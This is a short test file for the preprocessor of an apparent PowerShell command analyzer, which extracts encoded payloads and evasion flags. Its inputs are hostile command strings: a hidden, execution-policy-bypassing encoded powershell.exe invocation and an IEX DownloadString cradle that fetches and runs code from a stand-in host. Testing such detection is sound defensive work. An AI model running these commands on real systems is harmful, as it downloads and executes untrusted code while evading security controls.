// shared/analyzer/__tests__/preprocess.test.ts
import { describe, expect, it } from 'vitest'
import { preprocess } from '../preprocess'

describe('preprocess', () => {
  it('captures -enc payload and the evasion flags (prefix-matched, case-insensitive)', () => {
    const r = preprocess('powershell.exe -NoP -W Hidden -Ep Bypass -enc AAAA')
    expect(r.encoded).toBe('AAAA')
    const flags = r.flags.map((f) => f.flag).sort()
    expect(flags).toEqual(['-enc', '-ep', '-nop', '-w'])
  })

  it('leaves a non-wrapped script alone', () => {
    const r = preprocess("IEX (New-Object Net.WebClient).DownloadString('http://a/x')")
    expect(r.encoded).toBeNull()
    expect(r.script).toContain('DownloadString')
    expect(r.flags).toEqual([])
  })
})
